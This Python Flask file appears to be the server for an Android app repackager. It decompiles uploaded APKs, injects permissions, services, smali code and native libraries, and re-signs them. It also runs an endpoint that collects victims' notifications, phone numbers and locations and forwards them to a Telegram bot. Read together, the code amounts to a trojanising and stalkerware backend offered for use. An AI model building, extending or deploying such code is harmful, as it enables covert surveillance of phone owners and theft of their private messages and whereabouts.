#!/usr/bin/env python3
"""
Enhanced Flask App with Advanced APK Modification Features
Includes: Name change, version change, icon replacement, permission injection, etc.
"""

import os
import time
import uuid
import json
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
app.config['MAX_CONTENT_LENGTH'] = int(os.getenv('MAX_FILE_SIZE_MB', 100)) * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['OUTPUT_FOLDER'] = 'output'
app.config['TEMP_FOLDER'] = 'temp'

CORS(app)

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER'], app.config['TEMP_FOLDER']]:
    os.makedirs(folder, exist_ok=True)

# Store processing jobs
processing_jobs = {}

# Import utilities
from utils.advanced_apk_modifier import AdvancedAPKModifier
from utils.telegram_notifier import TelegramNotifier

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/api/advanced/modify', methods=['POST'])
def advanced_modify():
    """
    Advanced APK modification endpoint
    Supports: name change, version change, icon replacement, permission injection, etc.
    """
    try:
        # Get uploaded file
        if 'apk_file' not in request.files:
            return jsonify({'error': 'No APK file provided'}), 400
        
        file = request.files['apk_file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Save file
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Get modification options
        options = request.form.to_dict()
        
        # Parse JSON fields if present
        if 'permissions' in request.form:
            options['permissions'] = json.loads(request.form['permissions'])
        if 'strings' in request.form:
            options['strings'] = json.loads(request.form['strings'])
        if 'colors' in request.form:
            options['colors'] = json.loads(request.form['colors'])
        
        # Create job ID
        job_id = str(uuid.uuid4())
        
        # Initialize job info
        processing_jobs[job_id] = {
            'job_id': job_id,
            'status': 'queued',
            'progress': 0,
            'message': 'Queued for processing',
            'filename': filename,
            'original_name': file.filename,
            'started_at': datetime.now().isoformat(),
            'options': options
        }
        
        # Start processing in background
        thread = threading.Thread(
            target=advanced_process_apk,
            args=(job_id, filepath, options)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'job_id': job_id,
            'message': 'APK modification started'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def advanced_process_apk(job_id, filepath, options):
    """Background task for advanced APK processing"""
    try:
        processing_jobs[job_id]['status'] = 'processing'
        processing_jobs[job_id]['progress'] = 10
        processing_jobs[job_id]['message'] = 'Initializing advanced modifier...'
        
        # Initialize modifier
        output_dir = os.path.join(app.config['OUTPUT_FOLDER'], job_id)
        modifier = AdvancedAPKModifier(filepath, output_dir)
        
        # Step 1: Decompile
        processing_jobs[job_id]['progress'] = 20
        processing_jobs[job_id]['message'] = 'Decompiling APK...'
        modifier.decompile()
        
        # Step 2: Apply modifications based on options
        processing_jobs[job_id]['progress'] = 30
        processing_jobs[job_id]['message'] = 'Applying modifications...'
        
        # Change app name
        if 'app_name' in options and options['app_name']:
            processing_jobs[job_id]['message'] = 'Changing app name...'
            modifier.change_app_name(options['app_name'])
        
        # Change version
        if 'version_name' in options or 'version_code' in options:
            processing_jobs[job_id]['message'] = 'Updating version...'
            modifier.change_version(
                version_name=options.get('version_name'),
                version_code=options.get('version_code')
            )
        
        # Change package name
        if 'package_name' in options and options['package_name']:
            processing_jobs[job_id]['message'] = 'Changing package name...'
            modifier.change_package_name(options['package_name'])
        
        processing_jobs[job_id]['progress'] = 40
        
        # Replace icon
        if 'icon' in request.files:
            processing_jobs[job_id]['message'] = 'Replacing app icon...'
            icon_file = request.files['icon']
            icon_path = os.path.join(app.config['TEMP_FOLDER'], secure_filename(icon_file.filename))
            icon_file.save(icon_path)
            modifier.replace_icon(icon_path)
        
        processing_jobs[job_id]['progress'] = 50
        
        # Add permissions
        if 'permissions' in options and options['permissions']:
            processing_jobs[job_id]['message'] = 'Adding permissions...'
            modifier.add_permissions(options['permissions'])
        
        # Add activities
        if 'activities' in options and options['activities']:
            processing_jobs[job_id]['message'] = 'Adding activities...'
            for activity in options['activities']:
                modifier.add_activity(activity)
        
        # Add services
        if 'services' in options and options['services']:
            processing_jobs[job_id]['message'] = 'Adding services...'
            for service in options['services']:
                modifier.add_service(service)
        
        processing_jobs[job_id]['progress'] = 60
        
        # Inject smali code
        if 'smali_code' in options and options['smali_code']:
            processing_jobs[job_id]['message'] = 'Injecting custom code...'
            modifier.inject_smali_code(
                options.get('target_class', 'MainActivity'),
                options['smali_code']
            )
        
        # Modify strings
        if 'strings' in options and options['strings']:
            processing_jobs[job_id]['message'] = 'Modifying strings...'
            modifier.modify_strings(options['strings'])
        
        # Modify colors
        if 'colors' in options and options['colors']:
            processing_jobs[job_id]['message'] = 'Modifying colors...'
            modifier.modify_colors(options['colors'])
        
        processing_jobs[job_id]['progress'] = 70
        
        # Add native libraries
        if 'native_lib' in options and options['native_lib']:
            processing_jobs[job_id]['message'] = 'Adding native libraries...'
            modifier.add_native_library(
                options.get('lib_name', 'libcustom.so'),
                options.get('lib_path')
            )
        
        # Set SDK versions
        if 'min_sdk' in options:
            modifier.set_minimum_sdk(options['min_sdk'])
        if 'target_sdk' in options:
            modifier.set_target_sdk(options['target_sdk'])
        
        processing_jobs[job_id]['progress'] = 80
        
        # Step 3: Recompile
        processing_jobs[job_id]['message'] = 'Recompiling APK...'
        output_apk = modifier.recompile()
        
        processing_jobs[job_id]['progress'] = 90
        
        # Step 4: Sign
        processing_jobs[job_id]['message'] = 'Signing APK...'
        signed_apk = modifier.sign_apk(output_apk)
        
        processing_jobs[job_id]['progress'] = 95
        
        # Step 5: Optimize
        processing_jobs[job_id]['message'] = 'Optimizing APK...'
        final_apk = modifier.zipalign(signed_apk)
        
        # Generate report
        report = modifier.generate_report()
        
        # Complete
        processing_jobs[job_id]['status'] = 'completed'
        processing_jobs[job_id]['progress'] = 100
        processing_jobs[job_id]['message'] = 'APK modification completed successfully!'
        processing_jobs[job_id]['output_file'] = final_apk
        processing_jobs[job_id]['output_filename'] = f"modified_{processing_jobs[job_id]['original_name']}"
        processing_jobs[job_id]['completed_at'] = datetime.now().isoformat()
        processing_jobs[job_id]['report'] = report
        
        # Send Telegram notification
        if options.get('bot_token') and options.get('chat_id'):
            notifier = TelegramNotifier(options['bot_token'], options['chat_id'])
            notifier.send_message(
                f"✅ <b>APK Modification Completed</b>\n\n"
                f"📱 File: <code>{processing_jobs[job_id]['filename']}</code>\n"
                f"🔧 Modifications: {len(report['modifications'])}\n"
                f"🆔 Job ID: <code>{job_id}</code>\n"
                f"📥 Download: /download/{job_id}"
            )
    
    except Exception as e:
        processing_jobs[job_id]['status'] = 'failed'
        processing_jobs[job_id]['message'] = f'Error: {str(e)}'
        processing_jobs[job_id]['progress'] = 0

@app.route('/api/status/<job_id>')
def get_status(job_id):
    """Get job status"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify(processing_jobs[job_id])

@app.route('/api/download/<job_id>')
def download_modified(job_id):
    """Download modified APK"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = processing_jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'APK not ready'}), 400
    
    return send_file(
        job['output_file'],
        as_attachment=True,
        download_name=job['output_filename']
    )

@app.route('/api/report/<job_id>')
def get_report(job_id):
    """Get modification report"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = processing_jobs[job_id]
    if 'report' in job:
        return jsonify(job['report'])
    
    return jsonify({'error': 'Report not available'}), 404

# Device data endpoints (from original app.py)
device_data_store = []

@app.route('/api/device_data', methods=['POST'])
def receive_device_data():
    """Receive device data from Android app"""
    try:
        data = request.json
        device_data_store.append(data)
        
        # Send to Telegram if configured
        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        chat_id = os.getenv('TELEGRAM_CHAT_ID')
        
        if bot_token and chat_id:
            notifier = TelegramNotifier(bot_token, chat_id)
            
            data_type = data.get('type', 'unknown')
            data_content = data.get('data', {})
            timestamp = datetime.fromtimestamp(data.get('timestamp', 0) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            
            if data_type == 'notification':
                message = f"""
🔔 <b>New Notification</b>
📱 App: {data_content.get('package', 'Unknown')}
📋 Title: {data_content.get('title', 'N/A')}
💬 Text: {data_content.get('text', 'N/A')}
🕐 Time: {data_content.get('time', timestamp)}
"""
            elif data_type == 'device_data':
                device_info = data_content.get('device_info', {})
                location = data_content.get('location', {})
                battery = data_content.get('battery', {})
                
                message = f"""
📱 <b>Device Data Update</b>
━━━━━━━━━━━━━━━
<b>Device Info:</b>
• Model: {device_info.get('manufacturer', '')} {device_info.get('model', '')}
• Android: {device_info.get('android_version', '')}
• Phone: {device_info.get('phone_number', 'N/A')}

<b>Location:</b>
• Maps: {location.get('maps_url', 'N/A')}

<b>Battery:</b> {battery.get('percentage', 'N/A')}%

🕐 Time: {timestamp}
"""
            else:
                message = f"📊 Data received: {data_type}\n🕐 {timestamp}"
            
            notifier.send_message(message)
        
        return jsonify({'success': True, 'message': 'Data received'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device_data/list', methods=['GET'])
def list_device_data():
    """List all collected device data"""
    return jsonify({
        'total': len(device_data_store),
        'data': device_data_store[-50:]
    })

if __name__ == '__main__':
    host = os.getenv('HOST', '0.0.0.0')
    port = int(os.getenv('PORT', 5000))
    debug = os.getenv('DEBUG_MODE', 'false').lower() == 'true'
    
    print("=" * 60)
    print("APK Modifier - Advanced Edition")
    print("=" * 60)
    print(f"Server running on: http://{host}:{port}")
    print("Features:")
    print("  ✓ Change app name, version, package")
    print("  ✓ Replace icons and images")
    print("  ✓ Inject permissions, activities, services")
    print("  ✓ Inject custom code (smali)")
    print("  ✓ Modify resources (strings, colors)")
    print("  ✓ Add native libraries")
    print("  ✓ Full device monitoring")
    print("=" * 60)
    
    app.run(host=host, port=port, debug=debug)
